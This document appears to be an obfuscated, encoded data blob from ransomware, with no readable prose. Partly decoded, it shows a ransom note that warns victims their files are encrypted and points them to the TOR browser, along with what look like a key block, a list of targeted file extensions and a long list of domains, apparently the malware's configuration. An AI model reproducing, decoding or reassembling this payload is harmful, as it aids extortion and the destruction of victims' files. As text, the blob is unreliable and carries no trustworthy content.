dRB+EGQQeRB/EH4QMRAwEB0QGhAdEBoQURB8EHwQMBBpEH8QZRBiEDAQdhB5EHwQdRBjEDwQMBB0EH8QcxBlEH0QdRB+EGQQYxA8EDAQYBB4EH8QZBB/EGMQPBAwEHQQcRBkEHEQchBxEGMQdRBjEDAQcRB+EHQQMBB/EGQQeBB1EGIQMBB5EH0QYBB/EGIQZBBxEH4QZBAwEHYQeRB8EHUQYxAwEHEQYhB1EDAQdRB+EHMQYhBpEGAQZBB1EHQQMBBxEH4QdBAwEHgQcRBmEHUQMBBkEHgQdRAwEHUQaBBkEHUQfhBjEHkQfxB+ECoQMBA+EGsQVRBIEEQQVRBeEEMQWRBfEF4QbRAwEDAQHRAaEB0QGhBEEHgQdRAwEH8QfhB8EGkQMBB9EHUQZBB4EH8QdBAwEH8QdhAwEGIQdRBzEH8QZhB1EGIQeRB+EHcQMBB2EHkQfBB1EGMQMBB5EGMQMBBkEH8QMBBgEGUQYhBzEHgQcRBjEHUQMBBxEH4QMBBlEH4QeRBhEGUQdRAwEGAQYhB5EGYQcRBkEHUQMBB7EHUQaRA+EDAQXxB+EHwQaRAwEGcQdRAwEHMQcRB+EDAQdxB5EGYQdRAwEGkQfxBlEDAQZBB4EHkQYxAwEHsQdRBpEDAQcRB+EHQQMBB/EH4QfBBpEDAQZxB1EDAQcxBxEH4QMBBiEHUQcxB/EGYQdRBiEDAQaRB/EGUQYhAwEHYQeRB8EHUQYxA+EB0QGhAdEBoQHRAaEEQQeBB1EDAQYxB1EGIQZhB1EGIQMBBnEHkQZBB4EDAQaRB/EGUQYhAwEHsQdRBpEDAQeRBjEDAQeRB+EDAQcRAwEHMQfBB/EGMQdRB0EDAQfhB1EGQQZxB/EGIQexAwEEQQXxBCED4QMBBJEH8QZRAwEHMQcRB+EDAQdxB1EGQQMBBkEHgQdRBiEHUQMBByEGkQMBBkEHgQdRAwEHYQfxB8EHwQfxBnEHkQfhB3EDAQZxBxEGkQYxAqEB0QGhAdEBoQPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRAdEBoQHRAaEGwQMBAgED4QMBBUEH8QZxB+EHwQfxBxEHQQMBBEEH8QYhAwEHIQYhB/EGcQYxB1EGIQMBA9EDAQeBBkEGQQYBBjECoQPxA/EGcQZxBnED4QZBB/EGIQYBBiEH8QehB1EHMQZBA+EH8QYhB3ED8QMBAdEBoQHRAaEGwQMBAhED4QMBBZEH4QYxBkEHEQfBB8EDAQRBB/EGIQMBByEGIQfxBnEGMQdRBiEDAQHRAaEGwQMBAiED4QMBBfEGAQdRB+EDAQRBB/EGIQMBBSEGIQfxBnEGMQdRBiEDAQHRAaEGwQMBAjED4QMBBfEGAQdRB+EDAQfBB5EH4QexAwEHkQfhAwEEQQXxBCEDAQchBiEH8QZxBjEHUQYhAqEDAQMBAwEHgQZBBkEGAQKhA/ED8QdxBxEH4QdBBzEGIQcRByEH0QdhB1ECYQfRB+EHUQdhA+EH8QfhB5EH8QfhA/EGsQRRBDEFUQQhBZEFQQbRAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQHRAaEGwQMBAkED4QMBBWEH8QfBB8EH8QZxAwEGQQeBB1EDAQeRB+EGMQZBBiEGUQcxBkEHkQfxB+EGMQMBB/EH4QMBBkEHgQeRBjEDAQYBBxEHcQdRAwEB0QGhAdEBoQPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRA9ED0QPRAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQMBAwEDAQHRAaEDAQMBAwEDAQHRAaEB0QGhBfEH4QMBB/EGUQYhAwEGAQcRB3EHUQMBBpEH8QZRAwEGcQeRB8EHwQMBBjEHUQdRAwEHkQfhBjEGQQYhBlEHMQZBB5EH8QfhBjEDAQfxB+EDAQYBBxEGkQfRB1EH4QZBAwEHEQfhB0EDAQdxB1EGQQMBBkEHgQdRAwEH8QYBBgEH8QYhBkEGUQfhB5EGQQaRAwEGQQfxAwEHQQdRBzEGIQaRBgEGQQMBAhEDAQdhB5EHwQdRAwEHYQfxBiEDAQdhBiEHUQdRA+EDAQHRAaEB0QGhAdEBoQURBEEEQQVRBeEEQQWRBfEF4QMRAdEBoQHRAaEFkQXhAwEF8QQhBUEFUQQhAwEEQQXxAwEEAQQhBVEEYQVRBeEEQQMBBUEFEQRBBREDAQVBBREF0QURBXEFUQKhAdEBoQHRAaEDoQMBBUEF8QMBBeEF8QRBAwEF0QXxBUEFkQVhBJEDAQVRBeEFMQQhBJEEAQRBBVEFQQMBBWEFkQXBBVEEMQHRAaEDoQMBBUEF8QMBBeEF8QRBAwEFMQWBBREF4QVxBVEDAQVBBREEQQURAwEFIQVRBcEF8QRxAdEBoQHRAaEBAQEBAQEBAQEBAQEBAQEBAAAAAAAACPMoT8zJOi+2VIkHuT0YB4THKyHvC7OS4ylcfc+QTKTrel4um4Mc8daptjSDWTNCNMex58oq3dM2YCEkIxQqz8DYPlttRZBd27AqOMzIsGF0Ylonh86hmPsw/haIPP+cQ4HfzVQR9T5iE3r2kJsITVAiNBbdEC8XwnGFEAp+HBwM/qSWkOxafhYgfK9Eb7jLcvJBBZylpVJNcu2GzdEfKPlGvyAl7Sh93Cb1wTnMjDXjOMatB7kYCgLla+6cOyGyhWem29P3KdeYJRrAT0UknkSepuDNsJeis0Jd9zx6At+8s13lqqnfuCNeRS6gOE+tOWhgwTe4NcB3DLci7gZgPx7GrbOq+CIizXtFjmB9xS9D3GotiaAAAAOgUlBSsFdwVkBXcFJQUrBX8FbAV1BSUFKwVmBWQFZwUlBSsFZAV3BW8FJQUrBWkFfwVtBSUFKwVxBWQFdwUlBSsFMgV/BSUFKwViBX8FbAV1BSUFKwVsBXYFagUlBSsFfwUlBSsFMgUoBX8FbAV1BSUFKwVpBX8FaAVkBSUFKwVzBWgFfQUlBSsFcwVoBWEFbgUlBSsFcwVoBWAFaAUlBSsFcwVhBWwFJQUlBSsFcwVnBWoFfSUFBQUFAAAAAAAAOgUlBSsFNAV2BXEFJQUrBTMFNQU3BSUFKwVhBWoFZgVnBSUFKwV9BWkFaAUlBSsFfQVpBXYFfQUlBSsFfQVpBXYFaAUlBSsFfQVpBXEFfQUlBSsFfQVpBXEFaAUlBSsFfQVpBXYFZwUlBSsFfQVpBWQFJQUrBX0FaQVkBWgFJQUrBX0FaQVpBSUFKwV9BWkFcgUlBSsFdQV1BXEFJQUrBXUFagVxBSUFKwV1BXUFdgUlBSsFdQV1BXEFfQUlBSsFdQV1BXEFaAUlBSsFdQVqBXEFfQUlBSsFdQVqBXEFaAUlBSsFdQV1BWQFaAUlBSsFdQV1BXYFfQUlBSsFdQV1BXYFaAUlBSsFdgVpBWEFfQUlBSsFdgVpBWEFaAUlBSsFfQV1BXYFJQUrBX0FaQV2BSUFKwV9BWkFcQUlBSsFWgVhBWoFZgUlBSsFYQVqBXEFaAUlBSsFWgVhBWoFZgV9BSUFKwVkBWcFcgUlBSsFZAVmBXEFJQUrBWQFYQVqBWYFJQUrBWQFbAVoBSUFKwVkBWsFdgUlBSsFZAV1BW4FYgUlBSsFZAV1BXEFJQUrBWQFdgVmBSUFKwVkBXYFZgUlBSsFZAV2BWYFbAVsBSUFKwVkBXYFYAUlBSsFZAVxBXwFJQUrBWQFcgV1BSUFKwVkBXIFcQUlBSsFZAVyBXIFJQUrBWcFZAVhBSUFKwVnBWcFdgUlBSsFZwVhBXUFJQUrBWcFYQV3BSUFKwVnBWAFZAVrBSUFKwVnBWwFZwUlBSsFZwVsBWcFJQUrBWcFbAVnBXEFYAV9BSUFKwVnBWgFaQUlBSsFZwVrBWQFJQUrBWcFagVmBSUFKwVnBXcFfQUlBSsFZwVxBWEFJQUrBWcFfwVkBWcFcgUlBSsFZgVkBWkFZgVkBSUFKwVmBW0FZAV3BXYFYAVxBSUFKwVmBW0FZAV3BXEFJQUrBWYFbQVqBXcFYQUlBSsFZgVrBWgFJQUrBWYFagVhBSUFKwVmBXcFcgVpBSUFKwVmBXIFdgUlBSsFZgV8BWwFJQUrBWEFZgVkBSUFKwVhBWMFcQVsBSUFKwVhBWIFdgUlBSsFYQVsBX8FJQUrBWEFawVgBSUFKwVhBWoFcQUlBSsFYQVqBWYFJQUrBWEFagVmBWgFJQUrBWEFagVxBX0FJQUrBWEFagVmBX0FJQUrBWEFagVmBX0FaAVpBSUFKwVhBWoFZgV/BSUFKwVhBWoFfQUlBSsFYQV3BWoFdQVnBWoFfQUlBSsFYQV2BWYFJQUrBWEFcwVsBSUFKwVhBXIFYQUlBSsFYQV9BSUFKwVhBX0FZwUlBSsFYQV9BXUFJQUrBWAFbAVqBSUFKwVgBWwFcQUlBSsFYAVoBWMFJQUrBWAFaAVpBSUFKwVgBWgFaQV9BSUFKwVgBWgFcAVpBWAFZgVqBWkFaQVgBWYFcQVsBWoFawUlBSsFYAV1BXUFJQUrBWAFdwV3BSUFKwVgBXcFdwUlBSsFYAVxBWMFJQUrBWAFcQV9BSUFKwVgBXAFZgUlBSsFYwVkBWEFYAVsBWsFKwVxBWAFaAV1BWkFZAVxBWAFJQUrBWMFZAV0BSUFKwVjBWcFaQUlBSsFYwVmBWMFJQUrBWMFYQVjBSUFKwVjBWEFdwUlBSsFYwVhBXYFJQUrBWMFYQVxBSUFKwVjBWEFfQUlBSsFYwVhBX0FcQUlBSsFYwVjBXEFJQUrBWMFYgV2BSUFKwVjBWkFdwUlBSsFYwVqBWEFcQUlBSsFYwVqBXAFawVxBWQFbAVrBSUFKwVjBXUFcQUlBSsFYwV3BXEFJQUrBWMFcgVhBSUFKwVjBXIFYQVrBSUFKwViBWgFYQUlBSsFYgV1BWEFJQUrBWIFdQVrBSUFKwViBXYFYQUlBSsFYgVxBW0FdwUlBSsFYgVzBSUFKwVtBWcFbgUlBSsFbQVtBXEFJQUrBW0FdgUlBSsFbQVyBXUFJQUrBW0FcgV1BSUFKwVtBX8FJQUrBWwFYQV9BSUFKwVsBWwFaQUlBSsFbAV1BWMFJQUrBWwFdQV2BXUFagVxBSUFKwVvBWQFdwVzBWwFdgUlBSsFbwVsBXYFJQUrBW8FawV1BSUFKwVvBWoFYAUlBSsFbwV1BTQFJQUrBW8FdwVxBWMFJQUrBW8FcQVhBSUFKwVuBWAFdgUlBSsFbgVpBWIFJQUrBW4FaQViBSUFKwVuBWsFcQUlBSsFbgVqBWsFJQUrBW4FcgVhBSUFKwVpBWQFcQVgBX0FJQUrBWkFZwVxBSUFKwVpBWwFdgUlBSsFaQVrBXEFJQUrBWkFagViBSUFKwVpBXUFNwUlBSsFaQV2BXEFJQUrBWkFdgVxBSUFKwVpBXEFdwUlBSsFaQVxBX0FJQUrBWkFcAVgBSUFKwVpBXAFYwUlBSsFaQVyBXUFJQUrBWkFfQVjBWgFaQUlBSsFaQV8BXEFJQUrBWkFfAV9BSUFKwVoBWQFawUlBSsFaAVnBWoFfQUlBSsFaAVmBXIFJQUrBWgFYQUwBSUFKwVoBWAFJQUrBWgFYAVpBWkFJQUrBWgFYAVpBWkFYAVpBSUFKwVoBWwFawUlBSsFaAVrBXEFJQUrBWgFdgViBSUFKwVoBXIFJQUrBWgFcgVhBSUFKwVoBXIFdQUlBSsFawVnBSUFKwVrBWEFagVmBSUFKwVrBWMFagUlBSsFawViBWkFagV2BXYFJQUrBWsFbwV9BSUFKwVrBWoFcQVgBSUFKwVrBWoFcQVgBXYFJQUrBWsFagVyBSUFKwVrBXIFZgVxBX0FcQUlBSsFawVyBWgFJQUrBWsFcgV1BSUFKwVqBWYFdwUlBSsFagVhBWwFYwUlBSsFagVhBWgFJQUrBWoFYQVqBSUFKwVqBWEFcQUlBSsFagVjBWkFJQUrBWoFdQVgBWwFZgVqBSUFKwVqBXUFYAVrBWcFdgVhBSUFKwVqBXcFcQUlBSsFagVxBXEFJQUrBXUFMgV2BSUFKwV1BWQFYgVgBXYFJQUrBXUFZAViBWAFdgUoBXEFYAVjBSUFKwV1BWEFdQVmBWgFYQUlBSsFdQVjBX0FJQUrBXUFbwVxBSUFKwV1BWkFZAVsBWsFJQUrBXUFaQVkBWsFcQVwBWgFaQUlBSsFdQVoBWoFJQUrBXUFdwVxBSUFKwV1BXcFcQUlBSsFdQV2BXIFJQUrBXUFcAUlBSsFdQVzBW8FJQUrBXUFcwVoBSUFKwV1BXIFYQUlBSsFdQVyBWEFdQUlBSsFdQVyBWEFdQVpBSUFKwV1BXIFbAUlBSsFdQVyBXcFJQUrBXQFYQVpBSUFKwV0BXUFYwUlBSsFdwVkBWEFJQUrBXcFYAVkBWEFaAVgBSUFKwV3BWMFcQUlBSsFdwVsBXYFJQUrBXcFdQVxBSUFKwV3BXYFcQUlBSsFdwVxBWEFJQUrBXcFcQVjBSUFKwV3BXEFYwVhBSUFKwV3BXEFfQUlBSsFdwVwBWsFJQUrBXcFcwVjBSUFKwV3BX8FbgUlBSsFdwV/BWsFJQUrBXYFZAVjBSUFKwV2BWQFYwVgBXEFYAV9BXEFJQUrBXYFZAVoBSUFKwV2BWQFaAUlBSsFdgVkBXMFYAUlBSsFdgVmBWYFJQUrBXYFZgVoBSUFKwV2BWYFdwVsBXMFJQUrBXYFZgV3BWwFcwV9BSUFKwV2BWYFcQUlBSsFdgVmBXIFJQUrBXYFYQVoBSUFKwV2BWEFagVmBSUFKwV2BWEFcgUlBSsFdgVgBSUFKwV2BWAFdgV2BWwFagVrBSUFKwV2BWIFaAUlBSsFdgVsBWIFJQUrBXYFbgVmBWQFdwVhBSUFKwV2BWkFZAUlBSsFdgVpBWQFKwViBX8FJQUrBXYFaAVjBSUFKwV2BWgFdgUlBSsFdgV2BWQFJQUrBXYFcQVqBXcFfAUlBSsFdgVxBXcFbAVrBWIFdgUlBSsFdgVxBXIFJQUrBXYFcQV8BSUFKwV2BXAFZwVpBWwFaAVgBSgFdQV3BWoFbwVgBWYFcQUlBSsFdgVwBWcFaQVsBWgFYAUoBXIFagV3BW4FdgV1BWQFZgVgBSUFKwV2BX0FYgUlBSsFdgV9BXIFJQUrBXEFZAVnBSUFKwVxBWQFZwUlBSsFcQVhBWMFJQUrBXEFYQVjBSUFKwVxBWAFaAV1BWkFZAVxBWAFJQUrBXEFYAV9BSUFKwVxBWAFfQVxBSUFKwVxBWAFfQVxBWYFaQVsBXUFdQVsBWsFYgUlBSsFcQVtBXUFJQUrBXEFaQVnBSUFKwVxBWgFJQUrBXEFaAVhBSUFKwVxBWgFYQV9BSUFKwVxBWgFcwUlBSsFcQVoBXMFfQUlBSsFcQV1BWYFJQUrBXEFdwVgBWkFZwV8BSUFKwVxBXMFbwUlBSsFcQV9BXEFJQUrBXAFNgVsBSUFKwVwBWsFZAVwBXEFbQUlBSsFcAVrBX0FJQUrBXAFagVjBSUFKwVwBWoFcQUlBSsFcAV1BWEFJQUrBXAFcQVjBT0FJQUrBXAFcQV9BXEFJQUrBXMFZgVxBSUFKwVzBWsFcQUlBSsFcwVyBSUFKwVyBWcFbgUlBSsFcgVgBWcFYQVqBWYFJQUrBXIFawUlBSsFcgV1BSUFKwVyBXUFMQUlBSsFcgV1BTAFJQUrBXIFdQUzBSUFKwVyBXUFMgUlBSsFcgV1BWQFJQUrBXIFdQVhBSUFKwVyBXUFYQUlBSsFcgV1BWEFJQUrBXIFdQVpBSUFKwVyBXUFdgUlBSsFcgV1BXYFJQUrBXIFdQVxBSUFKwVyBXUFcQUlBSsFcgV1BXIFJQUrBXIFdwVsBSUFKwVyBXYFYQUlBSsFcgVxBXEFJQUrBXIFcQV9BSUFKwV9BWcFYQVqBWYFJQUrBX0FZwV1BWkFZAVxBWAFJQUrBX0FYQVpBSUFKwV9BWEFaQUlBSsFfQVyBXUFJQUrBX0FcgV1BSUFKwV9BXIFdQUlBSsFfQV8BSUFKwV9BXwFNgUlBSsFfQV8BXUFJQUrBX0FfAVyBSUFKwV/BWQFZwVyBSUFKwV/BXcFcQVjBSUFKwV/BXIFJQUFBQUAAAAAAPr7JQUrBWQFawVsBSUFKwVmBWQFZwUlBSsFZgV1BWkFJQUrBWYFcAV3BSUFKwVhBWwFZAViBWYFZAVnBSUFKwVhBWwFZAViBXUFbgViBSUFKwVhBWkFaQUlBSsFYQV3BXMFJQUrBWkFagVmBW4FJQUrBW0FaQV1BSUFKwVpBWEFYwUlBSsFbAVmBWkFJQUrBWwFZgVrBXYFJQUrBWwFZgVqBSUFKwVsBWYFdgUlBSsFaQVrBW4FJQUrBW4FYAV8BSUFKwVsBWEFfQUlBSsFaAVqBWEFJQUrBWgFdQVkBSUFKwVoBXYFZgUlBSsFaAV2BXUFJQUrBWgFdgV2BXEFfAVpBWAFdgUlBSsFaAV2BXAFJQUrBWsFagVoBWAFYQVsBWQFJQUrBWoFZgV9BSUFKwV1BXcFYwUlBSsFdwVqBWgFJQUrBXcFcQV1BSUFKwV2BWYFdwUlBSsFdgVtBXYFJQUrBXYFdQVpBSUFKwV2BXwFdgUlBSsFcQVtBWAFaAVgBSUFKwVxBW0FYAVoBWAFdQVkBWYFbgUlBSsFYAV9BWAFJQUrBWcFZAVxBSUFKwVmBWgFYQUlBSsFYgVkBWsFYQVmBXcFZAVnBSUFKwVOBVcFRAVHBSUFKwVGBVcFRAVHBSUFKwV/BWAFdwVqBXUFbQVkBWIFYAVaBWwFWgVpBWwFbgVgBVoFfAVqBXAFdwVaBXUFbAVmBXEFcAV3BWAFdgUFBQAAAAAAAAAAAAAAAAAAcgVyBXIFKwU3BWgFaAVqBXEFagV3BXYFdQVqBXcFcQUrBWcFbAV/BT4FcgVyBXIFKwVtBWQFZAV3BWIFYAVrBWQFcAUrBWcFbAV/BT4FcgVyBXIFKwVnBWwFfwV/BWwFawVsBWwFawVjBWwFdgV2BWwFKwVmBWoFaAU+BXIFcgVyBSsFbQVqBWkFfwVnBWoFZgVuBSsFZwVsBX8FPgVyBXIFcgUrBWMFaQVsBXUFcQV3BWQFfAUrBWcFbAV/BT4FcgVyBXIFKwV1BWwFfwVmBWQFaAUrBWYFagVoBT4FcgVyBXIFKwV2BXIFbAV2BXYFcgVgBWkFaQVrBWAFdgV2BSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQVyBWAFbAV2BXYFbQVqBXcFawUrBWYFagVoBT4FcgVyBXIFKwVyBW0FbAVxBWAFdQVqBWEFKwVmBWoFaAU+BXIFcgVyBSsFbQVkBXcFYQV3BWoFZgVuBW0FagVxBWAFaQVhBWQFcwVqBXYFKwVmBWoFaAU+BXIFcgVyBSsFZwVgBWkFcwVgBWEFYAV3BWAFKAVpBWoFZgVkBXcFawVqBSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQVjBWQFdwVsBWsFYAVxBSsFZgVqBWgFPgVyBXIFcgUrBW0FdwVuBSgFdwVkBWgFagV/BSsFZgVqBWgFPgVyBXIFcgUrBWgFagV3BWYFagVxBWAFKAV3BWAFdgVsBWEFYAVrBX8FZAUrBWYFagVoBT4FcgVyBXIFKwV2BWAFbAVxBWAFawV2BXUFdwVwBWsFYgV/BWwFaAVoBWAFdwU3BTEFKwVmBWoFaAU+BXIFcgVyBSsFZAV3BWcFYAV/BWwFYAUoBW0FagVxBWAFaQUrBWYFagVoBT4FcgVyBXIFKwVkBXAFZwVgBXcFYgVgBWgFagVrBXEFZwVpBWQFawVmBSsFZgVqBWgFPgVyBXIFcgUrBXEFagV3BW0FagVxBWAFaQUrBWYFagVoBT4FcgVyBXIFKwVkBWkFdQVgBWsFaQVqBWEFYgVgBSsFZgVqBWgFPgVyBXIFcgUrBWQFdQVkBXcFcQVtBWoFcQVgBWkFfwVwBXcFbAVmBW0FKwVmBWoFaAU+BXIFcgVyBSsFZwVrBWcFYQVgBWkFZAVmBWoFaQVpBWwFawVgBSsFZgVqBWgFPgVyBXIFcgUrBWAFaQVsBXEFYAUoBW0FagVxBWAFaQUrBWYFagVoBT4FcgVyBXIFKwVnBXcFbAV2BXEFagVpBSgFZAVhBWAFaQVnBWoFYQVgBWsFKwVmBWoFaAU+BXIFcgVyBSsFawVkBXEFbAVqBWsFZAVpBX8FYAV3BWgFZAVxBXEFKwVmBWoFaAU+BXIFcgVyBSsFcgVkBWQFYgVgBWIFaQVkBXcFcAV2BSsFZgVqBWgFPgVyBXIFcgUrBWkFbAVoBWgFZAVxBW0FagVjBSsFZgVqBWgFPgVyBXIFcgUrBWQFdQVkBXcFcQVoBWAFawVxBW0FZAVwBXYFKwVmBWoFaAU+BXIFcgVyBSsFZwVgBXcFYgVsBWsFdgVgBWkFKwVmBWoFaAU+BXIFcgVyBSsFZgVtBWQFaAVnBXcFYAUoBWEFKAVtBWoFcQVgBSgFZgVtBWAFfwUoBWMFaQVgBXAFdwV8BSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQUoBWcFaQVwBWgFYAVrBXEFZAVpBSsFZgVqBWgFPgVyBXIFcgUrBWMFZAVmBWAFZwVqBWoFbgUrBWYFagVoBT4FcgVyBXIFKwVpBWQFKAVjBWoFawVxBWQFbAVrBWAFKwVmBWoFaAU+BXIFcgVyBSsFaAVqBXAFawVxBWQFbAVrBW0FagV2BXEFYAVpBSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQVkBWkFZwVkBWsFZAV3BWAFZAVpBSsFZgVqBWgFPgVyBXIFcgUrBWIFYAVrBWAFcwVkBSsFYwV3BWQFdgVgBXcFdgVtBWoFdgV1BWwFcQVkBWkFbAVxBXwFKwVmBWoFaAU+BXIFcgVyBSsFaQVwBWIFZAVrBWoFbQVqBXEFYAVpBWQFYQVoBWwFdwVkBWkFKwVmBWoFaAU+BXIFcgVyBSsFZwVgBWkFaQVgBXMFcAVgBXIFbAVgBXYFYAVrBSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQVxBXcFcAVsBXEFYAUrBWYFagVoBT4FcgVyBXIFKwVtBWoFcQVgBWkFYgVkBXcFawVsBSgFZwVkBXEFcQVgBWkFaQVqBSsFZgVqBWgFPgVyBXIFcgUrBXYFYAVoBWwFawVkBXcFbQVqBXEFYAVpBSsFZgVqBWgFPgVyBXIFcgUrBW4FdwVqBWsFYAV3BWAFYgVgBWsFdgVnBWAFdwViBSsFZgVqBWgFPgVyBXIFcgUrBXUFcAVwBXcFYAVtBXAFcAV2BSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQUoBX8FYAV3BWgFZAVxBXEFKwVmBWoFaAU+BXIFcgVyBSsFdgVxBWYFbQV3BWwFdgVxBWoFdQVtBWAFdgVkBSsFZgVqBWgFPgVyBXIFcgUrBWsFbQUoBW0FagVxBWAFaQV2BSsFZgVqBWgFPgVyBXIFcgUrBXYFZgVtBXIFYAVrBWEFYAVpBWcFYAV3BWIFKwVmBWoFaAU+BXIFcgVyBSsFdgVxBWQFaQVhBWAFawUrBWYFagVoBT4FcgVyBXIFKwVzBWwFYgVrBWoFZwVpBWAFYQVqBXcFYAUrBWYFagVoBT4FcgVyBXIFKwVgBXwFbQVqBWkFfwUrBWYFagVoBT4FcgVyBXIFKwVjBWkFYAVoBWwFawViBXYFKAVtBWoFcQVgBWkFKwVmBWoFaAU+BXIFcgVyBSsFbQVsBWAFfQViBWAFawVgBXMFZAUrBWYFagVoBT4FcgVyBXIFKwV1BWAFcQVsBXEFKAV1BWQFdwVkBWEFbAV2BSsFZgVqBWgFPgVyBXIFcgUrBWcFYAV3BWIFbQVkBXAFdgUoBXEFagVrBWwFKwVmBWoFaAU+BXIFcgVyBSsFbQVqBXEFYAVpBWIFaQVkBWsFbAV2BSsFZgVqBWgFPgVyBXIFcgUrBTQFMwVgBWgFYAUrBWYFagVoBT4FcgVyBXIFKwV2BXEFZAVwBWcFZwVkBWYFbQUrBWYFagVoBT4FcgVyBXIFKwV2BWQFaAVrBWQFcAVrBWAFdwVtBWoFYwUrBWYFagVoBT4FcgVyBXIFKwVkBWwFdwV1BWoFdwVxBW0FagVxBWAFaQVnBWQFdgVgBWkFKwVmBWoFaAU+BXIFcgVyBSsFYAVpBWwFcQVgBSgFZwVsBWAFaQUrBWYFagVoBT4FcgVyBXIFKwVkBXAFZwVgBXcFYgVgBWYFagVwBXcFagVrBWsFYAUrBWYFagVoBT4FcgVyBXIFKwVpBWAFKAV2BWQFbAVrBXEFKAVtBXAFZwVgBXcFcQUrBWYFagVoBT4FcgVyBXIFKwVnBWoFawVoBWoFawVxBSsFZgVqBWgFPgVyBXIFcgUrBWYFaAUoBWkFagVhBWIFYAUrBWYFagVoBT4FcgVyBXIFKwVgBX0FdQVgBXcFbAVoBWAFawVxBWQFaQVmBW0FZAVpBWAFcQUrBWYFagVoBT4FcgVyBXIFKwViBXAFZAV3BWEFZAViBWoFaQVjBSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQVmBW0FYAV3BXwFKwVmBWoFaAU+BXIFcgVyBSsFbAVnBWwFdgUrBWYFagVoBT4FcgVyBXIFKwVoBWAFdwVmBXAFdwVgBSsFZgVqBWgFPgVyBXIFcgUrBW0FagVxBWAFaQVqBWkFYQVgBWsFKwVmBWoFaAU+BXIFcgVyBSsFYwVkBWYFYAVnBWoFagVuBSsFZgVqBWgFPgVyBXIFcgUrBW0FcAVwBXYFYgV2BXEFZAVkBWEFKwVmBWoFaAU+BXIFcgVyBSsFbQVqBXEFYAVpBXcFagVxBWoFawVhBWAFKwVmBWoFaAU+BXIFcgVyBSsFdwVgBWkFZAVsBXYFKAVmBXcFagV2BWAFcQV2BSsFZgVqBWgFPgVyBXIFcgUrBWkFYAV3BWwFZgVtBWAFaAVqBWsFYQUrBWYFagVoBT4FcgVyBXIFKwVtBWoFcQVgBWkFaQVsBWEFagUoBWkFcAViBWQFawVqBSsFZgVqBWgFPgVyBXIFcgUrBWQFaQVsBWgFYAVrBXEFZAV3BWwFcAVoBSsFagV3BWIFPgVyBXIFcgUrBXMFbAVxBWQFcQVgBXcFcQVsBWQFKwVqBXcFYgU+BXIFcgVyBSsFaQVkBXYFdgVkBWkFaQVgBSgFbQVkBXAFdgUrBWoFdwViBT4FcgVyBXIFKwVhBWAFdwVoBWQFawVrBSsFagV3BWIFPgVyBXIFcgUrBWsFYAVwBW0FagVjBSsFagV3BWIFPgVyBXIFcgUrBWoFdgVxBWAFdwVsBWQFYQVgBWkFZgVgBWsFcQV3BWoFKwVrBWAFcQU+BXIFcgVyBSsFZgVkBWsFcQVsBWsFYAV2BXAFdwVmBWoFcAV9BSsFawVgBXEFPgVyBXIFcgUrBWkFZAVmBWoFaAVoBXAFawVgBSsFawVgBXEFPgVyBXIFcgUrBW0FagVxBWAFaQVhBXcFYAVsBXcFagV2BWAFawUrBWsFYAVxBT4FcgVyBXIFKwVtBWoFcQVgBWkFYQV3BWAFbAV3BWoFdgVgBWsFKwVrBWAFcQU+BXIFcgVyBSsFbQVqBXEFYAVpBWEFdwVgBWwFdwVqBXYFYAVrBSsFawVgBXEFPgVyBXIFcgUrBWEFbAV2BWYFbQUrBWgFYAVtBXcFaAVkBXcFbgVgBWsFKwVrBWAFcQU+BXIFcgVyBSsFYgVgBWgFdQVgBXcFaQVgBSsFawVgBXEFPgVyBXIFcgUrBWIFZAV3BWQFYgVgBSgFdgVmBW0FcgV8BWsFKwVoBWAFbQV3BWgFZAV3BW4FYAVrBSsFawVgBXEFPgVyBXIFcgUrBXAFYAVnBWAFdwVpBWQFawVhBSgFYgVkBXcFZAViBWAFKwVoBWAFbQV3BWgFZAV3BW4FYAVrBSsFawVgBXEFPgVyBXIFcgUrBWYFZAVpBWwFdgVxBWoFKwVrBWAFcQU+BXIFcgVyBSsFdwUoBWYFagVsBWMFYwVwBXcFYAUrBWsFYAVxBT4FcgVyBXIFKwVuBXcFYAVkBXEFbAVjBXYFKwVrBWAFcQU+BXIFcgVyBSsFawVgBXEFcQUoBWYFagVsBWMFYwVwBXcFYAUrBWYFbQU+BXIFcgVyBSsFdgVkBWkFagVrBSgFZgVqBWwFYwVjBXAFdwVgBSgFYgVgBWsFYAVzBWAFKwVrBWAFcQU+BXIFcgVyBSsFYwVkBXcFZwVgBWYFbQVxBSsFawVgBXEFPgVyBXIFcgUrBW0FZAVkBXcFZAVxBWAFaQVsBWAFdwUrBWsFYAVxBT4FcgVyBXIFKwVzBWoFawUoBWQFdwV9BSsFawVgBXEFPgVyBXIFcgUrBWYFYAVpBWwFKAVzBWAFYgVkBXYFKAVkBXMFagVmBWQFcQV2BSsFawVgBXEFPgVyBXIFcgUrBWwFbQV3BSgFfwVsBWgFaAVgBXcFaAVkBWsFawUrBWsFYAVxBQUFBQUAAO0FBQUFWIboAF1ViEh9jASIQHn65UVtZHZtYHdgf2RhYCU5NiUtKyUsJC0lKywFbWBxYHFgdWB2YD8qKmZ2Myt1bG5kZ3Ard3AqdWp2cVpsaGIqNzU0Mio1Mio3NSo0NCo0MDU1MDI9Njc3NDc8MT0zPTQrb3ViBQUFBQWIQBBVXVV